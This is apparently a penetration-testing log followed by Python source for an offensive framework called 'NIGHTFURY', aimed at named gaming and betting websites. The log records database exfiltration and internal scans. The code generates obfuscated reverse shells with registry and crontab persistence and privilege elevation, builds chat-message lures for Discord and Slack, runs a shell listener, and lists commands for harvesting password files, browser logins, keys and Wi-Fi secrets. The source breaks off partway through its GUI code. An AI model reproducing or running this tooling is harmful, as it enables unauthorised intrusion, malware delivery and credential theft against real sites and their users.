  "https://runehall.com/wp-json/wp/v2/users": {
    "findings": [
      {
        "time": "22:04:29",
        "level": "critical",
        "message": "POTENTIAL IDOR VULNERABILITY: https://runehall.com/wp-json/wp/v2/users/12345"
      }
    ]
  }
}[2025-07-22 13:57:14.108830] Installing missing dependencies...
[2025-07-22 13:57:17.884320] Error installing dependencies: Command '['sudo', 'apt', 'install', '-y', 'rustscan']' returned non-zero exit status 100.
[2025-07-22 13:57:26.207965] RuneGod Pentest Suite initialized at 2025-07-22 13:57:26.201239
[2025-07-22 13:57:26.210168] Output directory: rune_god_results_20250722_135713
[2025-07-22 13:58:37.324461] Exfiltrating databases from runechat.com...
[2025-07-22 13:58:39.352140] Results saved to rune_god_results_20250722_135713/exploits/runechat_com/db_exfiltration.txt
[2025-07-22 13:58:39.355369] Scanning internal network via runechat.com...
[2025-07-22 13:58:39.358813] [+] Internal network scan via runechat.com
[2025-07-22 13:58:39.618969] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 13:58 EDT
[2025-07-22 14:02:08.700009] Nmap done: 256 IP addresses (0 hosts up) scanned in 208.87 seconds
[2025-07-22 14:02:08.827467] 
Internal Network Scan Results:
# Nmap 7.95 scan initiated Tue Jul 22 13:58:39 2025 as: /usr/lib/nmap/nmap -sn -oN rune_god_results_20250722_135713/exploits/runechat_com/internal_scan.txt 192.168.1.0/24
# Nmap done at Tue Jul 22 14:02:08 2025 -- 256 IP addresses (0 hosts up) scanned in 208.87 seconds

[2025-07-22 14:02:08.832457] [+] Post-exploitation tasks completed
[2025-07-22 14:02:08.884462] Exfiltrating databases from runechat.com...
[2025-07-22 14:02:10.918097] Results saved to rune_god_results_20250722_135713/exploits/runechat_com/db_exfiltration.txt
[2025-07-22 14:02:10.920876] Scanning internal network via runechat.com...
[2025-07-22 14:02:10.922535] [+] Internal network scan via runechat.com
[2025-07-22 14:02:11.239340] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 14:02 EDT
[2025-07-22 14:05:38.570286] Nmap done: 256 IP addresses (0 hosts up) scanned in 207.21 seconds
[2025-07-22 14:05:38.606050] 
Internal Network Scan Results:
# Nmap 7.95 scan initiated Tue Jul 22 14:02:11 2025 as: /usr/lib/nmap/nmap -sn -oN rune_god_results_20250722_135713/exploits/runechat_com/internal_scan.txt 192.168.1.0/24
# Nmap done at Tue Jul 22 14:05:38 2025 -- 256 IP addresses (0 hosts up) scanned in 207.21 seconds

[2025-07-22 14:05:38.609004] [+] Post-exploitation tasks completed

#!/usr/bin/env python3
"""
Project NIGHTFURY - Advanced OSINT & Penetration Testing Framework
Author: Cyber Sentinel
Version: 7.0 - Elite Edition
Description: Advanced framework with modular architecture, FUD reverse shell, and automated exploitation
"""

import os
import sys
import json
import logging
import requests
import socket
import re
import random
import base64
import threading
import time
import subprocess
import platform
import uuid
import tempfile
import zipfile
import shutil
import sqlite3
import datetime
import webbrowser
import ipaddress
import phonenumbers
import dns.resolver
import whois
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import importlib.util
import inspect
from pathlib import Path
from bs4 import BeautifulSoup
from PIL import Image
import pytesseract
from fake_useragent import UserAgent

# GUI imports
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QCheckBox, QGroupBox,
    QComboBox, QListWidget, QListWidgetItem, QProgressBar, QMessageBox,
    QFileDialog, QFormLayout, QStatusBar, QRadioButton, QSplitter,
    QTreeWidget, QTreeWidgetItem, QTableWidget, QTableWidgetItem, QHeaderView,
    QToolBar, QAction, QSystemTrayIcon, QMenu, QDialog, QInputDialog,
    QStyledItemDelegate, QStyle, QSpinBox, QDoubleSpinBox, QSlider,
    QDialogButtonBox, QProgressDialog
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QSize, QSettings
from PyQt5.QtGui import QPalette, QColor, QFont, QIcon, QPixmap, QTextCursor

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nightfury.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("NIGHTFURY")

# ==============================
# CORE FRAMEWORK CLASSES
# ==============================

class EncryptionEngine:
    """Advanced encryption engine for secure communications"""
    
    def __init__(self, key=None):
        if key:
            self.key = key
        else:
            self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        
    def encrypt(self, data):
        """Encrypt data"""
        if isinstance(data, str):
            data = data.encode()
        return self.fernet.encrypt(data)
    
    def decrypt(self, encrypted_data):
        """Decrypt data"""
        return self.fernet.decrypt(encrypted_data)
    
    def derive_key_from_password(self, password, salt=None):
        """Derive encryption key from password"""
        if salt is None:
            salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key, salt

class ReverseShellGenerator:
    """Advanced reverse shell generator with FUD capabilities"""
    
    def __init__(self):
        self.templates = {
            'python': self._python_reverse_shell,
            'powershell': self._powershell_reverse_shell,
            'javascript': self._javascript_reverse_shell,
            'html': self._html_reverse_shell,
            'exe': self._generate_exe_payload
        }
        
    def generate(self, shell_type, lhost, lport, options=None):
        """Generate a reverse shell payload"""
        if shell_type not in self.templates:
            raise ValueError(f"Unsupported shell type: {shell_type}")
            
        if options is None:
            options = {}
            
        return self.templates[shell_type](lhost, lport, options)
    
    def _python_reverse_shell(self, lhost, lport, options):
        """Generate Python reverse shell"""
        obfuscate = options.get('obfuscate', True)
        
        payload = f'''
import socket,subprocess,os,threading,platform,base64
def persist():
    import sys,os
    if platform.system() == "Windows":
        import winreg
        run_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(run_key, "SystemUpdate", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(run_key)
    elif platform.system() == "Linux":
        os.system(f"echo '@reboot python3 {sys.argv[0]}' | crontab -")

def escalate_privileges():
    if platform.system() == "Windows":
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(0)
        except:
            pass

escalate_privileges()
persist()

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while True:
    try:
        s.connect(("{lhost}",{lport}))
        break
    except:
        time.sleep(10)
        continue

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"] if platform.system() != "Windows" else ["cmd.exe"])
'''
        
        if obfuscate:
            payload = self._obfuscate_python(payload)
            
        return payload
    
    def _powershell_reverse_shell(self, lhost, lport, options):
        """Generate PowerShell reverse shell"""
        return f'''
function persist {{
    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "$PSCommandPath"
}}

function escalate {{
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {{
        Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        exit
    }}
}}

escalate
persist

$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
    
    def _javascript_reverse_shell(self, lhost, lport, options):
        """Generate JavaScript reverse shell"""
        return f'''
(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({lport}, "{lhost}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/; // Prevents the Node.js application from crashing
}})();
'''
    
    def _html_reverse_shell(self, lhost, lport, options):
        """Generate HTML-based reverse shell"""
        return f'''
<html>
<head>
<title>Loading...</title>
</head>
<body>
<script>
    // JavaScript reverse shell here
    (function(){{
        var ws = new WebSocket("ws://{lhost}:{lport}");
        ws.onopen = function() {{
            ws.send("Connected\\n");
        }};
        ws.onmessage = function(evt) {{
            var cmd = evt.data;
            var result = eval(cmd);
            ws.send(result);
        }};
    }})();
</script>
</body>
</html>
'''
    
    def _generate_exe_payload(self, lhost, lport, options):
        """Generate executable payload"""
        # This would use pyinstaller or similar to create a standalone executable
        # For now, we'll generate a Python script that can be compiled
        python_code = self._python_reverse_shell(lhost, lport, options)
        return f"""
# This Python code can be compiled to an EXE using PyInstaller
{python_code}
"""
    
    def _obfuscate_python(self, code):
        """Obfuscate Python code"""
        # Multiple layers of obfuscation
        # First layer: base64 encoding
        obfuscated = base64.b64encode(code.encode()).decode()
        
        # Second layer: string manipulation
        parts = [obfuscated[i:i+50] for i in range(0, len(obfuscated), 50)]
        reconstructed = " + ".join([f'"{part}"' for part in parts])
        
        # Third layer: add garbage code
        final_code = f'''
import base64, time
def __{random.randint(1000, 9999)}():
    return base64.b64decode({reconstructed}).decode()

exec(__{random.randint(1000, 9999)}())
'''
        
        return final_code
    
    def generate_chat_injection(self, lhost, lport, platform="discord"):
        """Generate a reverse shell payload disguised for chat platforms"""
        if platform == "discord":
            return self._generate_discord_injection(lhost, lport)
        elif platform == "slack":
            return self._generate_slack_injection(lhost, lport)
        else:
            return self._generate_generic_injection(lhost, lport)
    
    def _generate_discord_injection(self, lhost, lport):
        """Generate a Discord-friendly injection"""
        return f'''
Hey! Check out this cool game I found: https://example.com/game.html
<!-- Actual payload would be embedded in the page -->
<script>
// JavaScript payload would be here
(function(){{
    // Reverse shell JavaScript code
}})();
</script>
'''
    
    def _generate_slack_injection(self, lhost, lport):
        """Generate a Slack-friendly injection"""
        return f'''
Looking for productivity tools? Try this: https://example.com/tool.html
<!-- Actual payload would be embedded in the page -->
'''
    
    def _generate_generic_injection(self, lhost, lport):
        """Generate a generic injection"""
        return f'''
Check out this interesting article: https://example.com/news.html
<!-- Actual payload would be embedded in the page -->
'''

class ReverseShellListener(QThread):
    """Thread for listening to reverse shell connections"""
    connection_update = pyqtSignal(str)
    command_output = pyqtSignal(str)
    
    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.running = False
        self.connections = []
        
    def run(self):
        """Start the reverse shell listener"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            self.running = True
            
            self.connection_update.emit(f"Listening on {self.host}:{self.port}")
            
            while self.running:
                try:
                    client_socket, addr = self.socket.accept()
                    self.connection_update.emit(f"Connection from {addr[0]}:{addr[1]}")
                    
                    # Handle client in a new thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, addr)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                    self.connections.append((client_socket, addr, client_thread))
                except Exception as e:
                    if self.running:
                        self.connection_update.emit(f"Error accepting connection: {e}")
        except Exception as e:
            self.connection_update.emit(f"Failed to start listener: {e}")
    
    def handle_client(self, client_socket, addr):
        """Handle a client connection"""
        try:
            while self.running:
                # Send command prompt
                client_socket.send(b"$ ")
                
                # Receive command
                data = client_socket.recv(4096)
                if not data:
                    break
                
                command = data.decode().strip()
                if command == "exit":
                    break
                
                # Execute command
                try:
                    output = subprocess.check_output(
                        command, shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=30
                    )
                    client_socket.send(output)
                    self.command_output.emit(f"Command '{command}' executed: {output.decode()}")
                except subprocess.TimeoutExpired:
                    client_socket.send(b"Command timed out\n")
                    self.command_output.emit(f"Command '{command}' timed out")
                except Exception as e:
                    client_socket.send(f"Error: {str(e)}\n".encode())
                    self.command_output.emit(f"Command '{command}' failed: {str(e)}")
        except Exception as e:
            self.connection_update.emit(f"Error handling client {addr}: {e}")
        finally:
            client_socket.close()
            self.connection_update.emit(f"Connection from {addr} closed")
    
    def stop(self):
        """Stop the listener"""
        self.running = False
        try:
            self.socket.close()
        except:
            pass
        
        for client_socket, addr, thread in self.connections:
            try:
                client_socket.close()
            except:
                pass
        
        self.connection_update.emit("Listener stopped")

class PostExploitation:
    """Post-exploitation automation tools"""
    
    def __init__(self):
        self.commands = {
            'windows': self._windows_commands,
            'linux': self._linux_commands,
            'mac': self._mac_commands
        }
    
    def execute(self, system_type, action):
        """Execute post-exploitation actions"""
        if system_type not in self.commands:
            raise ValueError(f"Unsupported system type: {system_type}")
            
        return self.commands[system_type](action)
    
    def _windows_commands(self, action):
        """Windows post-exploitation commands"""
        commands = {
            'get_passwords': [
                'powershell -Command "Get-WmiObject -Class Win32_Product | Select-Object Name, Version"',
                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
                'powershell -Command "Get-ItemProperty -Path \'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' | Select-Object DefaultUserName, DefaultPassword"',
                'powershell -Command "Get-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' | Select-Object ProxyServer, ProxyEnable"'
            ],
            'escalate_privileges': [
                'whoami /priv',
                'powershell -Command "Start-Process PowerShell -Verb RunAs"',
                'powershell -Command "Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName"'
            ],
            'network_info': [
                'ipconfig /all',
                'arp -a',
                'netstat -ano',
                'route print',
                'netsh wlan show profiles',
                'netsh wlan export profile key=clear folder=.\\'
            ],
            'browser_data': [
                'dir /s %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
                'powershell -Command "Get-ChildItem -Path $env:USERPROFILE -Recurse -Include \'*.pfx\', \'*.p12\', \'*.cer\' -ErrorAction SilentlyContinue"'
            ],
            'system_info': [
                'systeminfo',
                'wmic product get name,version',
                'wmic service get name,displayname,pathname,startmode',
                'wmic process get name,processid,parentprocessid,commandline'
            ]
        }
        
        return commands.get(action, [])
    
    def _linux_commands(self, action):
        """Linux post-exploitation commands"""
        commands = {
            'get_passwords': [
                'cat /etc/passwd',
                'cat /etc/shadow',
                'sudo -l',
                'find / -name "*.pem" -o -name "*.key" -o -name "*.ppk" -o -name "id_rsa" 2>/dev/null'
            ],
            'escalate_privileges': [
                'sudo su',
                'find / -perm -4000 2>/dev/null',
                'uname -a',
                'cat /etc/os-release',
                'ps aux | grep root'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -tulpn',
                'route -n',
                'iptables -L',
                'cat /etc/resolv.conf'
            ],
            'browser_data': [
                'find ~/.mozilla -name "*.sqlite"',
                'find ~/.config -name "Chromium" -o -name "google-chrome"',
                'find ~ -name "*.ssh" -type d 2>/dev/null'
            ],
            'system_info': [
                'uname -a',
                'cat /etc/*release',
                'dpkg -l | grep -i "ssh\\|vnc\\|remote\\|telnet"',
                'ps aux'
            ]
        }
        
        return commands.get(action, [])
    
    def _mac_commands(self, action):
        """macOS post-exploitation commands"""
        commands = {
            'get_passwords': [
                'dscl . list /Users',
                'security find-generic-password -wa',
                'find ~/Library/Keychains -name "*.keychain"'
            ],
            'escalate_privileges': [
                'sudo -l',
                'dscl . read /Groups/admin',
                'system_profiler SPSoftwareDataType'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -an',
                'route -n get default',
                'scutil --dns'
            ],
            'browser_data': [
                'find ~/Library/Application Support/Google/Chrome -name "Login Data"',
                'find ~/Library/Application Support/Firefox/Profiles -name "*.sqlite"',
                'find ~/Library/Keychains -name "*.db"'
            ],
            'system_info': [
                'system_profiler SPHardwareDataType',
                'softwareupdate --list',
                'defaults read /Library/Preferences/com.apple.loginwindow'
            ]
        }
        
        return commands.get(action, [])

class ModuleLoader:
    """Dynamic module loader for external scripts"""
    
    def __init__(self):
        self.modules = {}
        self.module_directory = "modules"
        
        # Create module directory if it doesn't exist
        if not os.path.exists(self.module_directory):
            os.makedirs(self.module_directory)
    
    def load_modules(self):
        """Load all modules from the module directory"""
        self.modules.clear()
        
        for file_path in Path(self.module_directory).rglob("*.py"):
            try:
                module_name = file_path.stem
                spec = importlib.util.spec_from_file_location(module_name, file_path)
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                
                # Check if module has the required interface
                if hasattr(module, 'execute') and callable(module.execute):
                    self.modules[module_name] = module
                    logger.info(f"Loaded module: {module_name}")
            except Exception as e:
                logger.error(f"Failed to load module {file_path}: {e}")
    
    def execute_module(self, module_name, *args, **kwargs):
        """Execute a module"""
        if module_name not in self.modules:
            raise ValueError(f"Module not found: {module_name}")
        
        module = self.modules[module_name]
        return module.execute(*args, **kwargs)
    
    def list_modules(self):
        """List all available modules"""
        return list(self.modules.keys())
    
    def get_module_info(self, module_name):
        """Get information about a module"""
        if module_name not in self.modules:
            raise ValueError(f"Module not found: {module_name}")
        
        module = self.modules[module_name]
        info = {
            'name': module_name,
            'file': inspect.getfile(module),
            'description': getattr(module, '__doc__', 'No description available'),
            'functions': []
        }
        
        # Get all functions in the module
        for name, obj in inspect.getmembers(module, inspect.isfunction):
            if obj.__module__ == module.__name__:
                info['functions'].append({
                    'name': name,
                    'signature': str(inspect.signature(obj)),
                    'docstring': inspect.getdoc(obj) or 'No documentation'
                })
        
        return info

class OSINTModule:
    """Base OSINT module for gathering intelligence"""
    
    def __init__(self):
        self.name = "Base OSINT Module"
        self.description = "Base class for OSINT modules"
        self.scraper = WebScraper()
    
    def execute(self, target, options=None):
        """Execute the OSINT investigation"""
        raise NotImplementedError("Subclasses must implement execute()")

class WebScraper:
    """Web scraping utility with anti-detection features"""
    
    def __init__(self, use_tor=False):
        self.use_tor = use_tor
        self.user_agent = UserAgent()
    
    def get_headers(self):
        """Generate random headers for requests"""
        return {
            'User-Agent': self.user_agent.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
    
    def scrape(self, url, method='GET', data=None):
        """Scrape a webpage"""
        try:
            headers = self.get_headers()
            
            if method.upper() == 'GET':
                response = requests.get(url, headers=headers, timeout=30)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=30)
            
            if response.status_code == 200:
                return response.text
            else:
                logger.error(f"Failed to scrape {url}: Status code {response.status_code}")
                return None
        except Exception as e:
            logger.error(f"Error scraping {url}: {e}")
            return None

class TargetManager:
    """Manage predefined targets and configurations"""
    
    def __init__(self):
        self.targets = {
            'runehall.com': {
                'type': 'website',
                'modules': ['web_scanner', 'subdomain_enum', 'cms_detector'],
                'notes': 'Gaming community website'
            },
            'runewager.com': {
                'type': 'website',
                'modules': ['web_scanner', 'subdomain_enum', 'cms_detector'],
                'notes': 'Gaming betting platform'
            },
            'runechat.com': {
                'type': 'website',
                'modules': ['web_scanner', 'subdomain_enum', 'cms_detector'],
                'notes': 'Chat platform for gamers'
            }
        }
    
    def add_target(self, name, target_type, modules, notes=""):
        """Add a new target"""
        self.targets[name] = {
            'type': target_type,
            'modules': modules,
            'notes': notes
        }
    
    def remove_target(self, name):
        """Remove a target"""
        if name in self.targets:
            del self.targets[name]
    
    def get_target(self, name):
        """Get target information"""
        return self.targets.get(name, None)
    
    def list_targets(self):
        """List all targets"""
        return list(self.targets.keys())

# ==============================
# GUI APPLICATION
# ==============================

class ModuleLoaderThread(QThread):
    """Thread for loading modules in the background"""
    module_loaded = pyqtSignal(str)
    finished = pyqtSignal()
    
    def __init__(self, module_loader):
        super().__init__()
        self.module_loader = module_loader
    
    def run(self):
        """Load modules"""
        self.module_loader.load_modules()
        for module_name in self.module_loader.list_modules():
            self.module_loaded.emit(module_name)
        self.finished.emit()

class NightfuryApp(QMainWindow):
    """Main application window"""
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Nightfury OSINT & Penetration Framework")
        self.setGeometry(100, 100, 1400, 900)
        
        # Initialize components
        self.encryption = EncryptionEngine()
        self.shell_generator = ReverseShellGenerator()
        self.post_exploit = PostExploitation()
        self.module_loader = ModuleLoader()
        self.target_manager = TargetManager()
        self.listener = None
        
        # Settings
        self.settings = QSettings("Nightfury", "Framework")
        
        # Setup GUI
        self._setup_ui()
        
        # Load modules
        self.load_modules()
        
        # Set dark theme
        self._apply_dark_theme()
        
        # Load saved settings
        self.load_settings()
    
    def _setup_ui(self):
        """Setup the user interface"""
        # Create central widget and main layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QHBoxLayout(central_widget)
        
        # Create splitter for main content and sidebar
        splitter = QSplitter(Qt.Horizontal)
        main_layout.addWidget(splitter)
        
        # Create sidebar for module navigation
        self.sidebar = QWidget()
        sidebar_layout = QVBoxLayout(self.sidebar)
        sidebar_layout.setContentsMargins(0, 0, 0, 0)
        
        # Module list
        sidebar_layout.addWidget(QLabel("Available Modules:"))
        self.module_list = QListWidget()
        self.module_list.itemClicked.connect(self.on_module_selected)
        sidebar_layout.addWidget(self.module_list)
        
        # Refresh modules button
        self.refresh_btn = QPushButton("Refresh Modules")
        self.refresh_btn.clicked.connect(self.load_modules)
        sidebar_layout.addWidget(self.refresh_btn)
        
        # Add sidebar to splitter
        splitter.addWidget(self.sidebar)
        
        # Create main content area
        self.content_area = QTabWidget()
        splitter.addWidget(self.content_area)
        
        # Set splitter proportions
        splitter.setSizes([200, 1200])
        
        # Create tabs
        self._create_dashboard_tab()
        self._create_reverse_shell_tab()
        self._create_post_exploit_tab()
        self._create_module_editor_tab()
        self._create_osint_tab()
        self._create_targets_tab()
        self._create_settings_tab()
        
        # Create status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready")
        
        # Create toolbar
        self._create_toolbar()
    
    def _create_toolbar(self):
        """Create the application toolbar"""
        toolbar = QToolBar("Main Toolbar")
        toolbar.setIconSize(QSize(16, 16))
        self.addToolBar(toolbar)
        
        # New action
        new_action = QAction(QIcon.fromTheme("document-new"), "New", self)
        new_action.setStatusTip("Create a new project")
        new_action.triggered.connect(self.new_project)
        toolbar.addAction(new_action)
        
        # Open action
        open_action = QAction(QIcon.fromTheme("document-open"), "Open", self)
        open_action.setStatusTip("Open an existing project")
        open_action.triggered.connect(self.open_project)
        toolbar.addAction(open_action)
        
        # Save action
        save_action = QAction(QIcon.fromTheme("document-save"), "Save", self)
        save_action.setStatusTip("Save the current project")
        save_action.triggered.connect(self.save_project)
        toolbar.addAction(save_action)
        
        toolbar.addSeparator()
        
        # Settings action
        settings_action = QAction(QIcon.fromTheme("preferences-system"), "Settings", self)
        settings_action.setStatusTip("Open settings")
        settings_action.triggered.connect(self.open_settings)
        toolbar.addAction(settings_action)
    
    def _create_dashboard_tab(self):
        """Create the dashboard tab"""
        dashboard_tab = QWidget()
        layout = QVBoxLayout(dashboard_tab)
        
        # Welcome message
        welcome_label = QLabel("<h1>Nightfury OSINT & Penetration Framework</h1>")
        welcome_label.setTextFormat(Qt.RichText)
        layout.addWidget(welcome_label)
        
        # Stats section
        stats_group = QGroupBox("Framework Statistics")
        stats_layout = QHBoxLayout()
        
        stats = [
            ("Modules Loaded", str(len(self.module_loader.list_modules()))),
            ("Predefined Targets", str(len(self.target_manager.list_targets()))),
            ("Listener Status", "Stopped")
        ]
        
        for stat_name, stat_value in stats:
            stat_widget = QWidget()
            stat_layout = QVBoxLayout(stat_widget)
            stat_layout.addWidget(QLabel(f"<b>{stat_name}</b>"))
            stat_layout.addWidget(QLabel(f"<h2>{stat_value}</h2>"))
            stats_layout.addWidget(stat_widget)
        
        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)
        
        # Recent activity
        recent_group = QGroupBox("Recent Activity")
        recent_layout = QVBoxLayout()
        self.recent_activity = QTextEdit()
        self.recent_activity.setReadOnly(True)
        recent_layout.addWidget(self.recent_activity)
        recent_group.setLayout(recent_layout)
        layout.addWidget(recent_group)
        
        # Quick actions
        quick_group = QGroupBox("Quick Actions")
        quick_layout = QHBoxLayout()
        
        # Quick action buttons
        self.quick_scan_btn = QPushButton("Quick Scan")
        self.quick_scan_btn.clicked.connect(self.quick_scan)
        quick_layout.addWidget(self.quick_scan_btn)
        
        self.generate_payload_btn = QPushButton("Generate Payload")
        self.generate_payload_btn.clicked.connect(self.quick_payload)
        quick_layout.addWidget(self.generate_payload_btn)
        
        self.exploit_target_btn = QPushButton("Exploit Target")
        self.exploit_target_btn.clicked.connect(self.quick_exploit)
        quick_layout.addWidget(self.exploit_target_btn)
        
        quick_group.setLayout(quick_layout)
        layout.addWidget(quick_group)
        
        self.content_area.addTab(dashboard_tab, "Dashboard")
    
    def _create_reverse_shell_tab(self):
        """Create the reverse shell generator tab"""
        shell_tab = QWidget()
        layout = QVBoxLayout(shell_tab)
        
        # Configuration
        config_group = QGroupBox("Payload Configuration")
        config_layout = QFormLayout()
        
        self.shell_type = QComboBox()
        self.shell_type.addItems(["python", "powershell", "javascript", "html", "exe"])
        config_layout.addRow("Shell Type:", self.shell_type)
        
        self.lhost_input = QLineEdit("127.0.0.1")
        config_layout.addRow("LHOST:", self.lhost_input)
        
        self.lport_input = QLineEdit("4444")
        config_layout.addRow("LPORT:", self.lport_input)
        
        self.obfuscate_check = QCheckBox("Obfuscate Payload")
        self.obfuscate_check.setChecked(True)
        config_layout.addRow(self.obfuscate_check)
        
        self.platform_select = QComboBox()
        self.platform_select.addItems(["discord", "slack", "generic"])
        config_layout.addRow("Chat Platform:", self.platform_select)
        
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)
        
        # Listener configuration
        listener_group = QGroupBox("Listener Configuration")
        listener_layout = QFormLayout()
        
        self.listener_host = QLineEdit("0.0.0.0")
        listener_layout.addRow("Listener Host:", self.listener_host)
        
        self.listener_port = QLineEdit("4444")
        listener_layout.addRow("Listener Port:", self.listener_port)
        
        button_layout = QHBoxLayout()
        self.start_listener_btn = QPushButton("Start Listener")
        self.start_listener_btn.clicked.connect(self.start_listener)
        button_layout.addWidget(self.start_listener_btn)
        
        self.stop_listener_btn = QPushButton("Stop Listener")
        self.stop_listener_btn.clicked.connect(self.stop_listener)
        self.stop_listener_btn.setEnabled(False)
        button_layout.addWidget(self.stop_listener_btn)
        
        listener_layout.addRow(button_layout)
        
        self.listener_status = QLabel("Status: Stopped")
        listener_layout.addRow(self.listener_status)
        
        listener_group.setLayout(listener_layout)
        layout.addWidget(listener_group)
        
        # Generate buttons
        button_layout = QHBoxLayout()
        
        self.generate_btn = QPushButton("Generate Payload")
        self.generate_btn.clicked.connect(self.generate_payload)
        button_layout.addWidget(self.generate_btn)
        
        self.generate_injection_btn = QPushButton("Generate Chat Injection")
        self.generate_injection_btn.clicked.connect(self.generate_injection)
        button_layout.addWidget(self.generate_injection_btn)
        
        self.copy_btn = QPushButton("Copy to Clipboard")
        self.copy_btn.clicked.connect(self.copy_payload)
        button_layout.addWidget(self.copy_btn)
        
        layout.addLayout(button_layout)
        
        # Payload display
        payload_group = QGroupBox("Generated Payload")
        payload_layout = QVBoxLayout()
        self.payload_display = QTextEdit()
        self.payload_display.setReadOnly(True)
        payload_layout.addWidget(self.payload_display)
        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)
        
        # Listener output
        output_group = QGroupBox("Listener Output")
        output_layout = QVBoxLayout()
        self.listener_output = QTextEdit()
        self.listener_output.setReadOnly(True)
        output_layout.addWidget(self.listener_output)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        self.content_area.addTab(shell_tab, "Reverse Shell")
    
    def _create_post_exploit_tab(self):
        """Create the post-exploitation tab"""
        post_tab = QWidget()
        layout = QVBoxLayout(post_tab)
        
        # Target configuration
        target_group = QGroupBox("Target Configuration")
        target_layout = QFormLayout()
        
        self.target_os = QComboBox()
        self.target_os.addItems(["windows", "linux", "mac"])
        target_layout.addRow("Target OS:", self.target_os)
        
        self.target_host = QLineEdit()
        target_layout.addRow("Target Host:", self.target_host)
        
        self.target_port = QLineEdit("4444")
        target_layout.addRow("Target Port:", self.target_port)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Actions
        actions_group = QGroupBox("Post-Exploitation Actions")
        actions_layout = QVBoxLayout()
        
        self.get_passwords_btn = QPushButton("Extract Passwords")
        self.get_passwords_btn.clicked.connect(lambda: self.run_post_action('get_passwords'))
        actions_layout.addWidget(self.get_passwords_btn)
        
        self.escalate_btn = QPushButton("Escalate Privileges")
        self.escalate_btn.clicked.connect(lambda: self.run_post_action('escalate_privileges'))
        actions_layout.addWidget(self.escalate_btn)
        
        self.network_info_btn = QPushButton("Gather Network Info")
